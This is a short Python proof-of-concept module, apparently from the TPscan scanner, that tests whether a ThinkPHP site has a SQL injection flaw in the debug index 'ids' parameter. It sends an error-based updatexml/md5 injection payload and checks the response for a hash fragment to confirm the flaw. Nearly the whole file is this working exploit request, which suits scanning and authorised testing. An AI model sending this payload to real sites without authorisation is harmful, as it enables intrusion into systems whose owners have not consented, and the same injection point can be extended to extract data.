#!/usr/bin/env python
# coding=utf-8
import urllib
import requests
import urllib3
urllib3.disable_warnings()

def thinkphp_debug_index_ids_sqli_verify(url):
    pocdict = {
        "vulnname":"thinkphp_debug_index_ids_sqli",
        "isvul": False,
        "vulnurl":"",
        "payload":"",
        "proof":"",
        "response":"",
        "exception":"",
    }
    headers = {
        "User-Agent" : "TPscan",
    }
    payload = 'index.php?ids[0,UpdAtexml(0,ConcAt(0xa,Md5(2333)),0)]=1'
    try:
        vurl = urllib.parse.urljoin(url, payload)
        req = requests.get(vurl, headers=headers, timeout=15, verify=False)
        if r"56540676a129760" in req.text:
            pocdict['isvul'] = True
            pocdict['vulnurl'] = vurl
            pocdict['proof'] = '56540676a129760'
            pocdict['response'] = req.text
            print(pocdict)

    except:
        pass
